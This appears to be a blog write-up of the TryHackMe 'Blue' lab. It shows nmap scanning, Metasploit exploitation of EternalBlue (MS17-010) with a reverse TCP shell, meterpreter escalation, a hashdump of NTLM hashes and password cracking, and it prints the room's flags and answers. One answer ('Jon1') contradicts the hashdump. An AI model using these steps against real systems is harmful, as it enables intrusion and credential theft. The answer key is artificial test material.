---
title: Blue
date: 2025-11-03
draft: false
tags:
  - TryHackMe
  - Cybersecurity
  - Exploits
---
**Note:** 

- The questions are shortened for a cleaner view
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.

## Task  1 - Recon

#### 1) Scan the machine

No answer needed

#### 2) How many ports are open with a port number under 1000?

*Run an `nmap` scan*

```bash 
nmap -sS 10.48.163.163
```

```bash
root@ip-10-48-78-245:~# nmap -sS 10.48.163.163
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-03 10:12 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.48.163.163
Host is up (0.00029s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 5.38 seconds
```

**Ans:** `3`

#### 1) What is this machine vulnerable to?

*As the title suggests - Blue. That is Eternal Blue: MS17-010*

**Ans:** `MS17-010`

---
## Task  2 - Gain Access

#### 1) Start Metasploit.

No answer needed

```bash 
msfconsole
```

#### 2) Find the exploitation code we will run against the machine.

*We can use a module in metasploit for this task*

```bash
search MS17-010
```

```bash
search MS17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```

**Ans:** `exploit/windows/smb/ms17_010_eternalblue`

#### 3) Show options and set the one required value...

*We can find the required values from the options*

```bash
use 0
```

```bash
show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://d
                                             ocs.metasploit.com/docs/using-met
                                             asploit/basics/using-metasploit.h
                                             tml
```

```bash
setg RHOSTS 10.48.163.163
```

**Ans:** `RHOSTS`


*According to the task instructions we'll run the following commands*

```bash
`set payload windows/x64/shell/reverse_tcp`
```

```bash
run
```

`ctrl + z` - To background the process

---
## Task 3 - Escalate

#### 1) What is the name of the post module we will use?

*We can research a bit about this or use the search feature of metasploit*

**Ans:** `post/multi/manage/shell_to_meterpreter`

#### 2) What option are we required to change?

```bash
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to recei
                                       ve the connection
   LHOST                     no        IP of host that will receive the connec
                                       tion from the payload (Will try to auto
                                        detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

*We need to set the `SESSION` option*

```bash
set session 1
```

*After the conversion is done switch over to the. `meterpreter` session. You can use the `sessions -i` command to list the sessions*

```bash
sessions -i 2
```

*We can verify that we indeed have priveleges*

```bash
meterpreter > shell
Process 2604 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

*We can list the different process and choose on system process to migrate to -*

```bash
ps
```

```bash
2960  544   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\conhost.exe
 3064  692   TrustedInst  x64   0        NT AUTHORITY\SYST
             aller.exe                   EM

meterpreter > migrate 2960
[*] Migrating from 424 to 2960...
[*] Migration completed successfully.
```

*In this case I decided to migrate to `2960`*

---
## Task 4 - Cracking 
#### 1)What is the name of the non-default user?

*Use `hashdump` in meterpreter console*

```
hashdump
```

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Ans:** `Jon1`

#### 2) What is the cracked password?

*You can use an online hash cracker to achieve this. I ended up using `crackstation.com`*

**Ans:** `alqfna22`

---

## Task 5 - Find flags!

#### 1) Flag1? _This flag can be found at the system root._

*We can `cd..` 2 times to arrive at the system root as we were present in `system32`*

```bash
meterpreter > ls
Listing: C:\
============

Mode            Size   Type  Last modified            Name
----            ----   ----  -------------            ----
040777/rwxrwxr  0      dir   2018-12-13 03:13:36 +00  $Recycle.Bin
wx                           00
040777/rwxrwxr  0      dir   2009-07-14 06:08:56 +01  Documents and Settings
wx                           00
040777/rwxrwxr  0      dir   2009-07-14 04:20:08 +01  PerfLogs
wx                           00
040555/r-xr-xr  4096   dir   2019-03-17 22:22:01 +00  Program Files
-x                           00
040555/r-xr-xr  4096   dir   2019-03-17 22:28:38 +00  Program Files (x86)
-x                           00
040777/rwxrwxr  4096   dir   2019-03-17 22:35:57 +00  ProgramData
wx                           00
040777/rwxrwxr  0      dir   2018-12-13 03:13:22 +00  Recovery
wx                           00
040777/rwxrwxr  4096   dir   2025-11-03 10:48:12 +00  System Volume Informatio
wx                           00                       n
040555/r-xr-xr  4096   dir   2018-12-13 03:13:28 +00  Users
-x                           00
040777/rwxrwxr  16384  dir   2019-03-17 22:36:30 +00  Windows
wx                           00
040777/rwxrwxr  0      dir   2025-11-03 10:12:31 +00  badr
wx                           00
100666/rw-rw-r  24     fil   2019-03-17 19:27:21 +00  flag1.txt
w-                           00
000000/-------  0      fif   1970-01-01 01:00:00 +01  hiberfil.sys
--                           00
000000/-------  0      fif   1970-01-01 01:00:00 +01  pagefile.sys
--                           00

meterpreter > cat flag1.txt
flag{access_the_machine}
```

**Ans:** `flag{access_the_machine}`

#### 2) Flag2? _This flag can be found where passwords are stored ._

*Passwords are stored within `C:/WINDOWS/SYSTEM32/config`*

```bash
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode            Size      Type  Last modified           Name
----            ----      ----  -------------           ----
100666/rw-rw-r  28672     fil   2018-12-12 23:00:40 +0  BCD-Template
w-                              000
100666/rw-rw-r  25600     fil   2018-12-12 23:00:40 +0  BCD-Template.LOG
w-                              000
.....
wx                              000
100666/rw-rw-r  34        fil   2019-03-17 19:32:48 +0  flag2.txt
w-                              000
040777/rwxrwxr  4096      dir   2010-11-21 02:41:37 +0  systemprofile
wx                              000
```

```bash
meterpreter > cat flag2.txt 
flag{sam_database_elevated_access}
```

**Ans:** `flag{sam_database_elevated_access}`

#### 3) flag3? _This flag can be found in an excellent location to loot._

*This is in `Jon` (Users), Documents directory *

```bash
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 03:13:48 +0000  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 19:26:36 +0000  flag3.txt

meterpreter > cat flag3.txt 
flag{admin_documents_can_be_valuable}
```

**Ans:** `flag{admin_documents_can_be_valuable}`

---